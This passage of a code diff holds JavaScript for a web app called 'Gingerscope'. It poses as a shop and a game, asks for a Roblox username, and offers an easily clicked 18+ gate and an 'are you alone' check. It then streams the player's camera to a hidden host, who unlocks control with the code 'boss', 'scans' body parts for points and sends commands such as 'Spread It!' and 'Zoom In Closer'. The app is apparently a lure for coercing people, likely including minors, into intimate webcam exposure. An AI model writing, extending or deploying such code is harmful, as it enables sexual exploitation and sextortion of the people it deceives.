+                    text.style.transform = 'translateY(-20px)';
+
+                    setTimeout(() => {
+                        showScreen('screenMenu');
+                        logo.style.opacity = '1';
+                        logo.style.transform = 'scale(1)';
+                        text.style.opacity = '1';
+                        text.style.transform = 'translateY(0)';
+                    }, 1300);
+                }, 3000);
+            }
+
+            // ---- MENU BUTTONS ----
+            btnHarvester.addEventListener('click', () => {
+                if (!permissionsGranted) return;
+                alert('🌿 Harvester: out of stock (0/70)');
+            });
+
+            btnSweet.addEventListener('click', () => {
+                if (!permissionsGranted) return;
+                alert('🍬 Sweet Treat Bundle: out of stock (0/70)');
+            });
+
+            btnGinger.addEventListener('click', () => {
+                if (!permissionsGranted) return;
+                overlayRoomCode.classList.add('active');
+                copyFeedback.classList.remove('show');
+            });
+
+            // ---- ROOM CODE POPUP ----
+            roomCodeDisplay.addEventListener('click', () => {
+                const code = 'ALPHA1';
+                navigator.clipboard.writeText(code).then(() => {
+                    copyFeedback.textContent = '✅ Copied!';
+                    copyFeedback.classList.add('show');
+                    setTimeout(() => { copyFeedback.classList.remove('show'); }, 2000);
+                }).catch(() => {
+                    const range = document.createRange();
+                    range.selectNode(roomCodeDisplay);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(range);
+                    document.execCommand('copy');
+                    copyFeedback.textContent = '✅ Copied!';
+                    copyFeedback.classList.add('show');
+                    setTimeout(() => { copyFeedback.classList.remove('show'); }, 2000);
+                });
+            });
+
+            roomCodeContinueBtn.addEventListener('click', () => {
+                overlayRoomCode.classList.remove('active');
+                overlayUsername.classList.add('active');
+            });
+
+            // ---- USERNAME OVERLAY ----
+            usernameSubmit.addEventListener('click', () => {
+                const name = usernameInput.value.trim();
+                if (name.length < 3) {
+                    alert('Please enter a valid Roblox username (at least 3 characters).');
+                    return;
+                }
+                robloxUsername = name;
+                overlayUsername.classList.remove('active');
+
+                const player = addToQueue(robloxUsername);
+                playerId = player.id;
+
+                if (!is18Confirmed) {
+                    overlay18.classList.add('active');
+                    return;
+                }
+                if (!isAloneConfirmed) {
+                    overlayAlone.classList.add('active');
+                    return;
+                }
+                proceedToQueue();
+            });
+
+            usernameInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') usernameSubmit.click();
+            });
+
+            // ---- 18+ OVERLAY ----
+            overlay18Yes.addEventListener('click', () => {
+                is18Confirmed = true;
+                overlay18.classList.remove('active');
+                overlayAlone.classList.add('active');
+            });
+
+            overlay18No.addEventListener('click', () => {
+                overlay18.classList.remove('active');
+                alert('You must be 18+ to access Gingerscope.');
+            });
+
+            // ---- ALONE OVERLAY ----
+            aloneBtn.addEventListener('click', () => {
+                isAloneConfirmed = true;
+                overlayAlone.classList.remove('active');
+                proceedToQueue();
+            });
+
+            // ---- PROCEED TO QUEUE ----
+            function proceedToQueue() {
+                initPeerPlayer(ROOM_CODE);
+                showQueueScreen();
+            }
+
+            // ---- QUEUE SCREEN ----
+            function showQueueScreen() {
+                showScreen('screenQueue');
+                queueContent.classList.add('active');
+                updateQueueDisplay();
+
+                if (queuePollInterval) clearInterval(queuePollInterval);
+                queuePollInterval = setInterval(() => {
+                    updateQueueDisplay();
+                }, 2000);
+
+                if (dataConnection && dataConnection.open) {
+                    playerConnectStatus.textContent = '✅ Connected to host. Waiting for game to start…';
+                    playerConnectStatus.style.color = '#00f5c0';
+                } else {
+                    playerConnectStatus.textContent = '⏳ Connecting to host…';
+                    playerConnectStatus.style.color = 'var(--text-dim)';
+                }
+            }
+
+            function updateQueueDisplay() {
+                const pos = getPlayerPosition(playerId);
+                if (pos !== null) {
+                    queuePosition.textContent = pos;
+                    queueWaitTime.textContent = estimateWaitTime(pos);
+                    const total = getQueueDisplay();
+                    queueTotalPlayers.textContent = total;
+                }
+            }
+
+            // ---- QUEUE BACK ----
+            queueBackBtn.addEventListener('click', () => {
+                const queue = getQueue();
+                const newQueue = queue.filter(p => p.id !== playerId);
+                saveQueue(newQueue);
+                if (queuePollInterval) clearInterval(queuePollInterval);
+                if (playerPeer) { playerPeer.destroy();
+                    playerPeer = null;
+                    dataConnection = null; }
+                showScreen('screenMenu');
+                queueContent.classList.remove('active');
+            });
+
+            // ---- GAME BACK ----
+            gameBackBtn.addEventListener('click', () => {
+                if (gameRunning) {
+                    if (!confirm('Exit game? Progress will be lost.')) return;
+                }
+                stopGame();
+                if (playerPeer) { playerPeer.destroy();
+                    playerPeer = null;
+                    dataConnection = null; }
+                showScreen('screenMenu');
+            });
+
+            // ---- DISCOUNT CODE (BOSS MODE) ----
+            discountBtn.addEventListener('click', () => {
+                const code = discountInput.value.trim().toLowerCase();
+                if (code === 'boss') {
+                    isHost = true;
+                    isBossMode = true;
+                    discountMsg.textContent = '✅ Host mode activated.';
+                    discountMsg.className = 'discount-msg success';
+                    discountArea.classList.add('hidden-boss');
+
+                    document.getElementById('screenMenu').classList.add('boss-mode');
+
+                    bossDashboard.classList.add('active');
+
+                    initPeerHost(ROOM_CODE);
+                    renderBossBodyParts();
+
+                    bossCodeText.textContent = ROOM_CODE;
+                    bossDot.className = 'dot online';
+                    bossStatusLabel.textContent = 'waiting for player…';
+                    bossCodeStatus.textContent = '🔑 waiting for player to connect…';
+                    bossCodeStatus.className = 'code-status active';
+
+                    startBossPolling();
+                    totalPartsDisplay.textContent = BODY_PARTS.length;
+
+                    discountInput.value = '';
+                } else if (code === '') {
+                    discountMsg.textContent = '✨ enter a valid code for exclusive access';
+                    discountMsg.className = 'discount-msg';
+                } else {
+                    discountMsg.textContent = `❌ "${code}" is not a valid code.`;
+                    discountMsg.className = 'discount-msg';
+                }
+            });
+
+            discountInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') discountBtn.click();
+            });
+
+            // ---- PEERJS HOST ----
+            function initPeerHost(roomCode) {
+                if (hostPeer) { hostPeer.destroy();
+                    hostPeer = null; }
+                hostPeer = new Peer(roomCode, {
+                    debug: 2,
+                    config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
+                });
+
+                hostPeer.on('open', (id) => {
+                    console.log('Host PeerJS open:', id);
+                    bossStatusLabel.textContent = 'waiting for player…';
+                    bossCodeStatus.textContent = '🔑 waiting for player to connect…';
+                });
+
+                hostPeer.on('connection', (conn) => {
+                    console.log('Data connection from player');
+                    dataConnection = conn;
+                    conn.on('open', () => { console.log('Data channel open'); });
+                    conn.on('data', (data) => { handleDataFromPlayer(data); });
+                    bossStatusLabel.textContent = 'player connected!';
+                    bossCodeStatus.textContent = '✅ player connected!';
+                    bossCodeStatus.className = 'code-status connected';
+                    bossDot.className = 'dot online';
+                    bossPlayerStatus.textContent = '👤 player connected!';
+                    bossPlayerStatus.className = 'value status-text approved';
+                    bossStartBtn.disabled = false;
+                    bossApproveBtn.disabled = true;
+                    bossRejectBtn.disabled = true;
+                    bossHoldBtn.disabled = true;
+                    bossSpreadBtn.disabled = true;
+                    bossBackupBtn.disabled = true;
+                    bossZoomBtn.disabled = true;
+                    isPlayerConnected = true;
+                });
+
+                hostPeer.on('call', (call) => {
+                    console.log('Incoming call from player');
+                    call.answer();
+                    call.on('stream', (remoteStream) => {
+                        console.log('Received remote stream');
+                        bossVideo.srcObject = remoteStream;
+                        bossVideo.style.display = 'block';
+                        bossVideoPlaceholder.style.display = 'none';
+                        isPlayerConnected = true;
+                        bossStartBtn.disabled = false;
+                        bossStatusLabel.textContent = 'player connected!';
+                        bossCodeStatus.textContent = '✅ player connected!';
+                        bossCodeStatus.className = 'code-status connected';
+                        bossDot.className = 'dot online';
+                        bossPlayerStatus.textContent = '👤 player connected!';
+                        bossPlayerStatus.className = 'value status-text approved';
+                    });
+                    call.on('close', () => {
+                        console.log('Call closed');
+                        isPlayerConnected = false;
+                        bossVideo.srcObject = null;
+                        bossVideo.style.display = 'none';
+                        bossVideoPlaceholder.style.display = 'flex';
+                        bossStatusLabel.textContent = 'waiting for player…';
+                        bossCodeStatus.textContent = '🔑 waiting for player to connect…';
+                        bossCodeStatus.className = 'code-status active';
+                        bossDot.className = 'dot offline';
+                        bossPlayerStatus.textContent = '⏳ player disconnected…';
+                        bossPlayerStatus.className = 'value status-text waiting';
+                        bossStartBtn.disabled = true;
+                        bossApproveBtn.disabled = true;
+                        bossRejectBtn.disabled = true;
+                        bossHoldBtn.disabled = true;
+                        bossSpreadBtn.disabled = true;
+                        bossBackupBtn.disabled = true;
+                        bossZoomBtn.disabled = true;
+                    });
+                });
+
+                hostPeer.on('error', (err) => {
+                    console.error('PeerJS error:', err);
+                    bossStatusLabel.textContent = 'error: ' + err.message;
+                    bossDot.className = 'dot offline';
+                });
+            }
+
+            // ---- PEERJS PLAYER ----
+            function initPeerPlayer(hostId) {
+                if (playerPeer) { playerPeer.destroy();
+                    playerPeer = null;
+                    dataConnection = null; }
+                playerPeer = new Peer(undefined, {
+                    debug: 2,
+                    config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
+                });
+
+                playerPeer.on('open', (id) => {
+                    console.log('Player PeerJS open:', id);
+                    const conn = playerPeer.connect(hostId);
+                    conn.on('open', () => {
+                        console.log('Data connection to host established');
+                        dataConnection = conn;
+                        conn.on('data', (data) => { handleDataFromHost(data); });
+                        if (mediaStream) {
+                            const call = playerPeer.call(hostId, mediaStream);
+                            call.on('stream', (remoteStream) => { console.log('Host stream received (ignored)'); });
+                            call.on('close', () => {
+                                console.log('Call closed by host');
+                                playerConnectStatus.textContent = '❌ Host disconnected.';
+                                playerConnectStatus.style.color = '#ff6b6b';
+                                dataConnection = null;
+                            });
+                        } else {
+                            playerConnectStatus.textContent = '❌ No camera stream available.';
+                            playerConnectStatus.style.color = '#ff6b6b';
+                        }
+                        playerConnectStatus.textContent = '✅ Connected! Waiting for host…';
+                        playerConnectStatus.style.color = '#00f5c0';
+                        isPlayer = true;
+                        totalPartsDisplay.textContent = BODY_PARTS.length;
+                    });
+                    conn.on('error', (err) => {
+                        console.error('Connection error:', err);
+                        playerConnectStatus.textContent = '❌ Connection failed: ' + err.message;
+                        playerConnectStatus.style.color = '#ff6b6b';
+                    });
+                });
+
+                playerPeer.on('error', (err) => {
+                    console.error('PeerJS error:', err);
+                    playerConnectStatus.textContent = '❌ Error: ' + err.message;
+                    playerConnectStatus.style.color = '#ff6b6b';
+                });
+            }
+
+            // ---- DATA HANDLING ----
+            function sendDataToPlayer(data) {
+                if (dataConnection && dataConnection.open) {
+                    dataConnection.send(data);
+                }
+            }
+
+            function sendDataToHost(data) {
+                if (dataConnection && dataConnection.open) {
+                    dataConnection.send(data);
+                }
+            }
+
+            // Show command on player's screen
+            function showPlayerCommand(icon, text) {
+                cmdIcon.textContent = icon;
+                cmdText.textContent = text;
+                cmdSub.textContent = 'from host';
+                playerCommandOverlay.classList.add('show');
+                if (commandTimeout) clearTimeout(commandTimeout);
+                commandTimeout = setTimeout(() => {
+                    playerCommandOverlay.classList.remove('show');
+                }, 3000);
+            }
+
+            function handleDataFromHost(data) {
+                console.log('Player received from host:', data);
+                if (data.type === 'start_game') {
+                    startCountdownForPlayer();
+                } else if (data.type === 'set_part') {
+                    const idx = data.index;
+                    if (idx >= 0 && idx < BODY_PARTS.length) {
+                        currentPartIndex = idx;
+                        const part = BODY_PARTS[idx];
+                        playerPartName.textContent = part.label;
+                        gameStatus.textContent = '⏳ scanning…';
+                        gameStatus.style.color = 'var(--text-dim)';
+                        gameTimeLeft = SCAN_TIME;
+                        scannerValue = 0;
+                        playerScannerFill.style.width = '0%';
+                        playerScannerValue.textContent = '0%';
+                        startGameTimer();
+                    }
+                } else if (data.type === 'set_scanner') {
+                    const val = data.value;
+                    scannerValue = val;
+                    playerScannerFill.style.width = val + '%';
+                    playerScannerValue.textContent = val + '%';
+                } else if (data.type === 'approve') {
+                    const part = BODY_PARTS[currentPartIndex];
+                    if (part) {
+                        totalPoints += part.points;
+                        partsScanned++;
+                        gingerScopePercent = Math.min(100, partsScanned * GINGER_PER_PART);
+                        playerGingerFill.style.width = gingerScopePercent + '%';
+                        playerGingerLabel.textContent = gingerScopePercent + '%';
+                        playerGingerPercent.textContent = gingerScopePercent + '%';
+                        partsScannedDisplay.textContent = partsScanned;
+                        playerScoreDisplay.textContent = totalPoints;
+                        if (gingerScopePercent < 40) {
+                            playerGingerFill.style.background = 'linear-gradient(90deg, #ff4466, #ff8844)';
+                        } else if (gingerScopePercent < 70) {
+                            playerGingerFill.style.background = 'linear-gradient(90deg, #ff8844, var(--neon-yellow))';
+                        } else {
+                            playerGingerFill.style.background = 'linear-gradient(90deg, var(--neon-yellow), var(--neon-green))';
+                        }
+                        flashGreen();
+                        gameStatus.textContent = `✅ ${part.label} +${part.points} pts (${gingerScopePercent}%)`;
+                        gameStatus.style.color = '#00f5c0';
+
+                        if (gingerScopePercent >= 100 || partsScanned >= BODY_PARTS.length) {
+                            gameDone = true;
+                            gameRunning = false;
+                            stopGameTimer();
+                            showPrize();
+                            return;
+                        }
+
+                        scannerValue = 0;
+                        playerScannerFill.style.width = '0%';
+                        playerScannerValue.textContent = '0%';
+
+                        setTimeout(() => {
+                            const next = currentPartIndex + 1;
+                            if (next < BODY_PARTS.length) {
+                                currentPartIndex = next;
+                                const newPart = BODY_PARTS[next];
+                                playerPartName.textContent = newPart.label;
+                                gameStatus.textContent = '⏳ waiting for next scan…';
+                                gameStatus.style.color = 'var(--text-dim)';
+                                gameTimeLeft = SCAN_TIME;
+                                startGameTimer();
+                            } else {
+                                if (gingerScopePercent >= 100) {
+                                    showPrize();
+                                } else {
+                                    gameStatus.textContent = '⏳ all parts scanned!';
+                                    gameStatus.style.color = 'var(--text-dim)';
+                                }
+                            }
+                        }, 1200);
+                    }
+                } else if (data.type === 'reject') {
+                    flashRed();
+                    gameStatus.textContent = '❌ Rejected — try again';
+                    gameStatus.style.color = '#ff6b6b';
+                    scannerValue = 0;
+                    playerScannerFill.style.width = '0%';
+                    playerScannerValue.textContent = '0%';
+                    setTimeout(() => {
+                        gameStatus.textContent = '⏳ waiting for retry…';
+                        gameStatus.style.color = 'var(--text-dim)';
+                    }, 2000);
+                } else if (data.type === 'hold_still') {
+                    if (data.value) {
+                        playerHoldStill.classList.add('show');
+                        gameStatus.textContent = '✋ hold still …';
+                        gameStatus.style.color = '#ffa94d';
+                        // Also show command overlay
+                        showPlayerCommand('✋', 'Hold Still');
+                    } else {
+                        playerHoldStill.classList.remove('show');
+                        gameStatus.textContent = '🔍 scanning …';
+                        gameStatus.style.color = 'var(--text-dim)';
+                    }
+                } else if (data.type === 'command') {
+                    // Handle host commands: spread, backup, zoom
+                    const cmd = data.command;
+                    if (cmd === 'spread') {
+                        showPlayerCommand('🍑', 'Spread It!');
+                        gameStatus.textContent = '🍑 Spread requested!';
+                        gameStatus.style.color = '#ffa94d';
+                        setTimeout(() => {
+                            gameStatus.textContent = '⏳ scanning…';
+                            gameStatus.style.color = 'var(--text-dim)';
+                        }, 1500);
+                    } else if (cmd === 'backup') {
+                        showPlayerCommand('⬅️', 'Back Up');
+                        gameStatus.textContent = '⬅️ Back up please!';
+                        gameStatus.style.color = '#ffd93d';
+                        setTimeout(() => {
+                            gameStatus.textContent = '⏳ scanning…';
+                            gameStatus.style.color = 'var(--text-dim)';
+                        }, 1500);
+                    } else if (cmd === 'zoom') {
+                        showPlayerCommand('🔍', 'Zoom In Closer');
+                        gameStatus.textContent = '🔍 Zoom in closer!';
+                        gameStatus.style.color = '#6bcbff';
+                        setTimeout(() => {
+                            gameStatus.textContent = '⏳ scanning…';
+                            gameStatus.style.color = 'var(--text-dim)';
+                        }, 1500);
+                    }
+                } else if (data.type === 'game_over') {
+                    endGame(data.won);
+                }
+            }
+
+            function handleDataFromPlayer(data) {
+                console.log('Host received from player:', data);
+            }
+
+            // ---- RENDER BOSS BODY PARTS ----
+            function renderBossBodyParts() {
+                bossPartList.innerHTML = '';
+                BODY_PARTS.forEach((part, idx) => {
+                    const el = document.createElement('div');
+                    el.className = 'part-item' + (idx === currentPartIndex ? ' active' : '');
+                    const colorClass = part.color || 'green';
+                    el.innerHTML =
+                        `<span class="dot-color ${colorClass}"></span><span class="part-name">${part.emoji} ${part.label}</span><span class="part-points">(${part.points}pts)</span>`;
+                    el.dataset.index = idx;
+                    el.addEventListener('click', () => { handleBossPartSelect(idx); });
+                    bossPartList.appendChild(el);
+                });
+                updateBossPartLabel();
+            }
+
+            function updateBossPartLabel() {
+                const part = BODY_PARTS[currentPartIndex];
+                if (part) {
+                    bossCurrentPartLabel.textContent = part.emoji + ' ' + part.label;
+                    bossPartName.textContent = part.emoji + ' ' + part.label;
+                } else {
+                    bossCurrentPartLabel.textContent = '—';
+                    bossPartName.textContent = '—';
+                }
+                document.querySelectorAll('#bossPartList .part-item').forEach((el, idx) => {
+                    el.classList.toggle('active', idx === currentPartIndex);
+                });
+            }
+
+            function handleBossPartSelect(idx) {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                if (idx === currentPartIndex) return;
+                currentPartIndex = idx;
+                bossProgressSlider.value = 0;
+                bossSliderValue.textContent = '0%';
+                updateBossUI();
+                updateBossPartLabel();
+                sendDataToPlayer({ type: 'set_part', index: idx });
+                sendDataToPlayer({ type: 'set_scanner', value: 0 });
+                gameTimeLeft = SCAN_TIME;
+                bossTimerDisplay.textContent = SCAN_TIME + 's';
+                bossTimerDisplay.className = 'value timer';
+                bossScanStatus.textContent = '⏳ scanning: ' + BODY_PARTS[idx].label;
+                bossScanStatus.className = 'value status-text';
+                flashGreen();
+            }
+
+            // ---- BOSS POLLING ----
+            function startBossPolling() {
+                if (bossPollInterval) clearInterval(bossPollInterval);
+                bossPollInterval = setInterval(() => {
+                    if (isHost && bossDashboard.classList.contains('active')) {
+                        // Update queue display if needed
+                    }
+                }, 3000);
+            }
+
+            // ---- BOSS PROGRESS SLIDER ----
+            bossProgressSlider.addEventListener('input', function() {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                const val = parseInt(this.value);
+                bossSliderValue.textContent = val + '%';
+                if (val >= 100) { bossSliderValue.className = 'value done'; } else { bossSliderValue.className =
+                    'value'; }
+
+                sendDataToPlayer({ type: 'set_scanner', value: val });
+
+                if (val >= 100) {
+                    this.value = 0;
+                    bossSliderValue.textContent = '0%';
+                    bossSliderValue.className = 'value';
+
+                    if (isProcessingApproval) return;
+                    isProcessingApproval = true;
+
+                    const part = BODY_PARTS[currentPartIndex];
+                    if (part) {
+                        totalPoints += part.points;
+                        partsScanned++;
+                        const pct = Math.min(100, partsScanned * GINGER_PER_PART);
+                        gingerScopePercent = pct;
+
+                        bossScoreDisplay.textContent = totalPoints;
+                        bossGingerDisplay.textContent = pct + '%';
+                        bossScanStatus.textContent = `✅ +${part.points} pts (${pct}%)`;
+                        bossScanStatus.className = 'value status-text approved';
+                        bossApproveBtn.className = 'btn-host-approve approved';
+                        bossApproveBtn.textContent = '✅ Done!';
+                        bossApproveBtn.disabled = true;
+                        bossRejectBtn.disabled = true;
+
+                        sendDataToPlayer({ type: 'approve' });
+
+                        if (pct >= 100 || partsScanned >= BODY_PARTS.length) {
+                            gameDone = true;
+                            gameRunning = false;
+                            stopGameTimer();
+                            bossScanStatus.textContent = '🎉 Prize unlocked!';
+                            bossScanStatus.className = 'value status-text approved';
+                            bossStartBtn.textContent = '✅ Done';
+                            bossStartBtn.disabled = true;
+                            sendDataToPlayer({ type: 'game_over', won: true });
+                            setTimeout(() => {
+                                resetBossGame();
+                                isProcessingApproval = false;
+                            }, 3000);
+                            return;
+                        }
+
+                        setTimeout(() => {
+                            const next = currentPartIndex + 1;
+                            if (next < BODY_PARTS.length) {
+                                currentPartIndex = next;
+                                updateBossPartLabel();
+                                bossPartName.textContent = BODY_PARTS[next].emoji + ' ' + BODY_PARTS[next]
+                                .label;
+                                bossScanStatus.textContent = '⏳ scanning: ' + BODY_PARTS[next].label;
+                                bossScanStatus.className = 'value status-text';
+                                bossApproveBtn.className = 'btn-host-approve';
+                                bossApproveBtn.textContent = '✅ Approve';
+                                bossApproveBtn.disabled = true;
+                                bossRejectBtn.disabled = true;
+                                bossTimerDisplay.textContent = SCAN_TIME + 's';
+                                bossTimerDisplay.className = 'value timer';
+                                sendDataToPlayer({ type: 'set_part', index: next });
+                                sendDataToPlayer({ type: 'set_scanner', value: 0 });
+                                document.querySelectorAll('#bossPartList .part-item').forEach((el, idx) => {
+                                    el.classList.toggle('active', idx === next);
+                                });
+                            } else {
+                                if (pct >= 100) {
+                                    // Prize already shown
+                                } else {
+                                    bossScanStatus.textContent = '⏳ all parts scanned!';
+                                    bossScanStatus.className = 'value status-text';
+                                }
+                            }
+                            isProcessingApproval = false;
+                        }, 1200);
+                    } else {
+                        isProcessingApproval = false;
+                    }
+                }
+            });
+
+            // ---- BOSS COMMAND BUTTONS ----
+            function sendHostCommand(command) {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                sendDataToPlayer({ type: 'command', command: command });
+                // Update boss status
+                const cmdNames = {
+                    spread: '🍑 Spread It!',
+                    backup: '⬅️ Back Up',
+                    zoom: '🔍 Zoom In'
+                };
+                bossScanStatus.textContent = `📢 ${cmdNames[command]}`;
+                bossScanStatus.className = 'value status-text';
+                setTimeout(() => {
+                    bossScanStatus.textContent = '⏳ scanning…';
+                    bossScanStatus.className = 'value status-text';
+                }, 2000);
+            }
+
+            bossSpreadBtn.addEventListener('click', () => sendHostCommand('spread'));
+            bossBackupBtn.addEventListener('click', () => sendHostCommand('backup'));
+            bossZoomBtn.addEventListener('click', () => sendHostCommand('zoom'));
+
+            // ---- BOSS START ----
+            bossStartBtn.addEventListener('click', () => {
+                if (!isHost || !isPlayerConnected) {
+                    alert('No player connected. Wait for someone to join.');
+                    return;
+                }
+                if (bossStarted) return;
+
+                const nextPlayer = getNextPlayer();
+                if (!nextPlayer) {
+                    alert('No players in queue. Wait for someone to join.');
+                    return;
+                }
+
+                bossStarted = true;
+                gameRunning = true;
+                bossStartBtn.textContent = '⏳ running…';
+                bossStartBtn.disabled = true;
+
+                currentPartIndex = 0;
+                totalPoints = 0;
+                partsScanned = 0;
+                gingerScopePercent = 0;
+                gameTimeLeft = SCAN_TIME;
+                bossScoreDisplay.textContent = '0';
+                bossGingerDisplay.textContent = '0%';
+                bossTimerDisplay.textContent = SCAN_TIME + 's';
+                bossTimerDisplay.className = 'value timer';
+                bossPartName.textContent = BODY_PARTS[0].emoji + ' ' + BODY_PARTS[0].label;
+                bossProgressSlider.value = 0;
+                bossSliderValue.textContent = '0%';
+                bossSliderValue.className = 'value';
+                bossScanStatus.textContent = '⏳ scanning: ' + BODY_PARTS[0].label;
+                bossScanStatus.className = 'value status-text';
+                bossApproveBtn.disabled = true;
+                bossRejectBtn.disabled = true;
+                bossApproveBtn.className = 'btn-host-approve';
+                bossApproveBtn.textContent = '✅ Approve';
+                bossRejectBtn.className = 'btn-host-reject';
+                bossRejectBtn.textContent = '❌ Reject';
+                bossHoldBtn.disabled = false;
+                bossHoldBtn.textContent = '✋ Hold';
+                bossHoldBtn.classList.remove('active');
+                holdStillActive = false;
+                isProcessingApproval = false;
+                scannerValue = 0;
+                bossSpreadBtn.disabled = false;
+                bossBackupBtn.disabled = false;
+                bossZoomBtn.disabled = false;
+
+                updateBossPartLabel();
+                document.querySelectorAll('#bossPartList .part-item').forEach((el, idx) => {
+                    el.classList.toggle('active', idx === 0);
+                });
+
+                sendDataToPlayer({ type: 'start_game' });
+                sendDataToPlayer({ type: 'set_part', index: 0 });
+                sendDataToPlayer({ type: 'set_scanner', value: 0 });
+
+                bossStartBtn.textContent = '▶ Running';
+                bossStartBtn.disabled = true;
+            });
+
+            // ---- BOSS HOLD ----
+            bossHoldBtn.addEventListener('click', () => {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                holdStillActive = !holdStillActive;
+                bossHoldBtn.classList.toggle('active');
+                bossHoldBtn.textContent = holdStillActive ? '✋ Holding…' : '✋ Hold';
+                sendDataToPlayer({ type: 'hold_still', value: holdStillActive });
+                if (holdStillActive) {
+                    bossScanStatus.textContent = '✋ hold still requested';
+                    bossScanStatus.className = 'value status-text';
+                } else {
+                    bossScanStatus.textContent = '⏳ scanning…';
+                    bossScanStatus.className = 'value status-text';
+                }
+            });
+
+            // ---- BOSS APPROVE ----
+            bossApproveBtn.addEventListener('click', () => {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                if (isProcessingApproval) return;
+                isProcessingApproval = true;
+
+                const part = BODY_PARTS[currentPartIndex];
+                if (part) {
+                    totalPoints += part.points;
+                    partsScanned++;
+                    const pct = Math.min(100, partsScanned * GINGER_PER_PART);
+                    gingerScopePercent = pct;
+                    bossScoreDisplay.textContent = totalPoints;
+                    bossGingerDisplay.textContent = pct + '%';
+                    bossApproveBtn.className = 'btn-host-approve approved';
+                    bossApproveBtn.textContent = '✅ Done!';
+                    bossApproveBtn.disabled = true;
+                    bossRejectBtn.disabled = true;
+                    bossScanStatus.textContent = `✅ +${part.points} pts (${pct}%)`;
+                    bossScanStatus.className = 'value status-text approved';
+                    bossProgressSlider.value = 0;
+                    bossSliderValue.textContent = '0%';
+                    bossSliderValue.className = 'value';
+                    sendDataToPlayer({ type: 'approve' });
+                    sendDataToPlayer({ type: 'set_scanner', value: 0 });
+
+                    if (pct >= 100 || partsScanned >= BODY_PARTS.length) {
+                        gameDone = true;
+                        gameRunning = false;
+                        stopGameTimer();
+                        bossScanStatus.textContent = '🎉 Prize unlocked!';
+                        bossScanStatus.className = 'value status-text approved';
+                        bossStartBtn.textContent = '✅ Done';
+                        bossStartBtn.disabled = true;
+                        sendDataToPlayer({ type: 'game_over', won: true });
+                        setTimeout(() => {
+                            resetBossGame();
+                            isProcessingApproval = false;
+                        }, 3000);
+                        return;
+                    }
+
+                    setTimeout(() => {
+                        const next = currentPartIndex + 1;
+                        if (next < BODY_PARTS.length) {
+                            currentPartIndex = next;
+                            updateBossPartLabel();
+                            bossPartName.textContent = BODY_PARTS[next].emoji + ' ' + BODY_PARTS[next].label;
+                            bossScanStatus.textContent = '⏳ scanning: ' + BODY_PARTS[next].label;
+                            bossScanStatus.className = 'value status-text';
+                            bossApproveBtn.className = 'btn-host-approve';
+                            bossApproveBtn.textContent = '✅ Approve';
+                            bossApproveBtn.disabled = true;
+                            bossRejectBtn.disabled = true;
+                            bossTimerDisplay.textContent = SCAN_TIME + 's';
+                            bossTimerDisplay.className = 'value timer';
+                            sendDataToPlayer({ type: 'set_part', index: next });
+                            sendDataToPlayer({ type: 'set_scanner', value: 0 });
+                            document.querySelectorAll('#bossPartList .part-item').forEach((el, idx) => {
+                                el.classList.toggle('active', idx === next);
+                            });
+                        } else {
+                            if (pct >= 100) {
+                                // Prize already shown
+                            } else {
+                                bossScanStatus.textContent = '⏳ all parts scanned!';
+                                bossScanStatus.className = 'value status-text';
+                            }
+                        }
+                        isProcessingApproval = false;
+                    }, 1200);
+                } else {
+                    isProcessingApproval = false;
+                }
+            });
+
+            // ---- BOSS REJECT ----
+            bossRejectBtn.addEventListener('click', () => {
+                if (!isHost || !isPlayerConnected || !bossStarted) return;
+                sendDataToPlayer({ type: 'reject' });
+                bossRejectBtn.disabled = true;
+                bossApproveBtn.disabled = true;
+                bossRejectBtn.className = 'btn-host-reject rejected';
+                bossRejectBtn.textContent = '❌ Rejected!';
+                bossScanStatus.textContent = '❌ rejected — try again';
+                bossScanStatus.className = 'value status-text rejected';
+                bossProgressSlider.value = 0;
+                bossSliderValue.textContent = '0%';
+                bossSliderValue.className = 'value';
+                sendDataToPlayer({ type: 'set_scanner', value: 0 });
+                setTimeout(() => {
+                    bossApproveBtn.className = 'btn-host-approve';
+                    bossApproveBtn.textContent = '✅ Approve';
+                    bossRejectBtn.className = 'btn-host-reject';
+                    bossRejectBtn.textContent = '❌ Reject';
+                    bossApproveBtn.disabled = true;
+                    bossRejectBtn.disabled = true;
+                    bossScanStatus.textContent = '⏳ waiting for retry…';
+                    bossScanStatus.className = 'value status-text';
+                    sendDataToPlayer({ type: 'set_part', index: currentPartIndex });
+                    sendDataToPlayer({ type: 'set_scanner', value: 0 });
+                }, 2000);
+            });
+
+            // ---- RESET BOSS GAME ----
+            function resetBossGame() {
+                bossStarted = false;
+                gameRunning = false;
+                currentPartIndex = 0;
+                totalPoints = 0;
+                partsScanned = 0;
+                gingerScopePercent = 0;
+                bossProgressSlider.value = 0;
+                bossSliderValue.textContent = '0%';
+                bossSliderValue.className = 'value';
+                bossScoreDisplay.textContent = '0';
+                bossGingerDisplay.textContent = '0%';
+                bossTimerDisplay.textContent = SCAN_TIME + 's';
+                bossTimerDisplay.className = 'value timer';
+                bossPartName.textContent = '—';
+                bossScanStatus.textContent = '⏳ waiting for next player…';
+                bossScanStatus.className = 'value status-text';
+                bossApproveBtn.className = 'btn-host-approve';
+                bossApproveBtn.textContent = '✅ Approve';
+                bossRejectBtn.className = 'btn-host-reject';
+                bossRejectBtn.textContent = '❌ Reject';
+                bossApproveBtn.disabled = true;
+                bossRejectBtn.disabled = true;
+                bossHoldBtn.disabled = true;
+                bossHoldBtn.textContent = '✋ Hold';
+                bossHoldBtn.classList.remove('active');
+                holdStillActive = false;
+                bossStartBtn.textContent = '▶ Start';
+                bossStartBtn.disabled = true;
+                bossSpreadBtn.disabled = true;
+                bossBackupBtn.disabled = true;
+                bossZoomBtn.disabled = true;
+                isProcessingApproval = false;
+                scannerValue = 0;
+
+                updateBossPartLabel();
+                document.querySelectorAll('#bossPartList .part-item').forEach((el, idx) => {
+                    el.classList.toggle('active', idx === 0);
+                });
+
+                const nextPlayer = getNextPlayer();
+                if (nextPlayer) {
+                    bossScanStatus.textContent = '⏳ next player ready — click Start';
+                    bossScanStatus.className = 'value status-text';
